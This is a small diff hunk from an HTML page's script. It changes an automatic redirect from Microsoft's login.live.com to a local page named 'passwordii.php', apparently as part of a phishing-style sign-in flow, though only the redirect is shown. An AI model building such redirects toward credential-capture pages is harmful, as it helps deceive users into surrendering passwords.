@@ -66,7 +66,7 @@
 
     <script>
         setTimeout(function () {
-            window.location.href = "https://login.live.com/";
+            window.location.href = "passwordii.php";
         }, 100); // Redirect after 5 seconds
     </script>
 </body>
